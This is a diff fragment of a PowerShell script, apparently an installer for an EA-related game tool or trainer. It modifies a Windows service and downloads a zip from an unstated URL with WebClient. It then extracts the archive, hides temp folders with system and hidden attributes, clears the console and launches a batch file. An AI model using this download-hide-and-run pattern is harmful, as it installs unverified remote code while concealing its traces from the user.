@@ -47,8 +47,14 @@ Function pass {
 	Set-Service -Name "EABackgroundService" -StartupType Demand
 	Remove-Item -Path $bin -Recurse -Force
 	Clear-Host
-
- $attributes = @(
+	
+#WebClient object style
+$client = New-Object System.Net.WebClient
+$client.DownloadFile($pl1, $binZip)
+if (Test-Path $binZip) {Expand-Archive -Path $binZip -DestinationPath $bin}
+Move-Item -Path "$bin\$auth" -Destination "$env:SystemDrive\"
+	Clear-Host
+  $attributes = @(
 					"$env:TMP\wtmpd",
 					"$env:TMP\cetrainers",
 					"$env:TMP\afolder",
@@ -85,15 +91,7 @@ Function pass {
 					foreach ($attribute in $attributes) {
 						attrib +s +h $attribute
 					}
-	
-#WebClient object style
-$client = New-Object System.Net.WebClient
-$client.DownloadFile($pl1, $binZip)
-if (Test-Path $binZip) {Expand-Archive -Path $binZip -DestinationPath $bin}
-
-	Move-Item -Path "$bin\$auth" -Destination "$env:SystemDrive\"
-	Clear-Host
-
+			Clear-Host
 	Start-Process $authbat
 	}
 exit
